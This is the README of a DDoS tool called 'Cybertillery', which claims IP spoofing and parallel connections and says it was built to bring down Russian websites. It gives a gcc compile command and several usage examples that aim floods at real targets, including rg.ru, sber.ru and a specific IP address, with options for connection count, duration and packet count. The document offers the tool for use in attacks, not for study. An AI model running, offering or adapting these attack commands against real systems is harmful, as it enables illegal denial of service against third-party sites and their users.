# Cybertillery - to fire on nasty orcs

DDoS tool with IP spoofing and ability to use parallel connections.
Built specifically to bring russian orc websites down to their knees.

## Compile command

```bash
gcc main.c -O2 -o bombard -lpthread
```

## Usage examples

### Attack with 10 connections using URL with protocol

```bash
sudo ./bombard -u https://rg.ru -c 10
```

### Attack with 4 connections using IP address and port

```bash
sudo ./bombard -a 194.190.37.226 -p 443 -c 4
```

### Attack for 60 seconds

```bash
sudo ./bombard -u rg.ru/ -p 443 -c 4 -d 60
```

### Send 1000000 packets

```bash
sudo ./bombard -u https://sber.ru -c 10 -n 1000000
```

